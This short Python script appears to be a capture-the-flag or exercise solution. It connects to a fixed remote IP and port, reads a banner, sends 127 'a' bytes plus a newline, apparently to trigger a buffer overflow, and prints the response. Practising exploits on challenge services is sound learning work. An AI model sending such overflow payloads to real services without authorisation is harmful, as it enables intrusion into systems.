import socket
import time

HOST = '140.113.207.245'
PORT = 30170

def main():
    payload = b'a' * 127 + b'\n'

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        
        data = s.recv(1024)
        # print(data.decode(errors='ignore'), end='')

        s.sendall(payload)

        time.sleep(0.5)
        response = s.recv(4096)
        print(response.decode(errors='ignore'), end='')

if __name__ == '__main__':
    main()
